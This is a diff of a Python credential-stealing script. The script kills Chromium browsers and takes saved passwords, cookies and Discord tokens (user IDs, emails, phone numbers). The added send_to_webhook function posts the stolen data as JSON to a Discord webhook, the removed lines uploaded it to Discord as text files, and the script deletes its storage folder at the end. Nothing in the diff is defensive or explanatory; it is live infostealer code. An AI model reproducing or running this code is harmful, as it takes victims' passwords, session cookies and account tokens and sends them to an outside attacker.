@@ -1,4 +1,3 @@
-
 import base64
 import json
 import os
@@ -212,6 +211,14 @@ def validate_discord_token(token):
 def taskkill(taskname):
     subprocess.run(["taskkill", "/F", "/IM", taskname], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+def send_to_webhook(data, description):
+    payload = {
+        "username": "Data Extractor",
+        "content": f"**{description}**\n```json\n{json.dumps(data, indent=2)}```"
+    }
+    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+    return response.status_code == 200
+
 for browser in CHROMIUM_BROWSERS:
     taskkill(browser["taskname"])
     local_state_path = os.path.join(browser["path"], "Local State")
@@ -353,45 +360,16 @@ for discord_path in DISCORD_PATHS:
     except Exception as e:
         print(f"Error extracting Discord tokens: {e}")
 
-# Save extracted data
+# Send extracted data to webhook
 if PASSWORDS:
-    with open(os.path.join(STORAGE_PATH, "Passwords.txt"), "w") as f:
-        f.write(
-            f"\n{'-'*50}\n".join([
-                f"LOCATION: {pw['browser']} - {pw['profile']}\n"
-                f"URL: {pw['url']}\n"
-                f"USERNAME: {pw['username']}\n"
-                f"PASSWORD: {pw['password']}"
-                for pw in PASSWORDS
-            ])
-        )
-    upload_to_discord(os.path.join(STORAGE_PATH, "Passwords.txt"), "Passwords.txt")
+    send_to_webhook(PASSWORDS, "Extracted Passwords")
 
-for cookie in COOKIES:
-    with open(os.path.join(STORAGE_PATH, f"Cookies-{cookie['browser']}-{cookie['profile']}.txt"), "w") as f:
-        f.write(base64.b64decode(cookie["cookies"]).decode())
-    upload_to_discord(os.path.join(STORAGE_PATH, f"Cookies-{cookie['browser']}-{cookie['profile']}.txt"), f"Cookies-{cookie['browser']}-{cookie['profile']}.txt")
+if COOKIES:
+    for cookie in COOKIES:
+        send_to_webhook(cookie, f"Cookies - {cookie['browser']} - {cookie['profile']}")
 
 if DISCORD_TOKENS:
-    with open(os.path.join(STORAGE_PATH, "discord-tokens.txt"), "w") as f:
-        f.write(
-            f"\n{'-' * 50}\n".join([
-                f"ID: {discord_token['user_id']}\n"
-                f"USERNAME: {discord_token['username']}\n"
-                f"DISPLAY NAME: {discord_token['display_name']}\n"
-                f"EMAIL: {discord_token['email']}\n"
-                f"PHONE: {discord_token['phone']}\n"
-                f"TOKEN: {discord_token['token']}"
-                for discord_token in DISCORD_TOKENS
-            ])
-        )
-    upload_to_discord(os.path.join(STORAGE_PATH, "discord-tokens.txt"), "discord-tokens.txt")
-
-for file_to_upload in os.listdir(STORAGE_PATH):
-    try:
-        upload_to_discord(os.path.join(STORAGE_PATH, file_to_upload), file_to_upload)
-    except Exception as e:
-        print(f"Error uploading file {file_to_upload}: {e}")
+    send_to_webhook(DISCORD_TOKENS, "Discord Tokens")
 
 # Search and upload files based on keywords
 for path in PATHS_TO_SEARCH:
@@ -499,4 +477,3 @@ try:
     shutil.rmtree(STORAGE_PATH)
 except Exception as e:
     print(f"Error during cleanup: {e}")
-
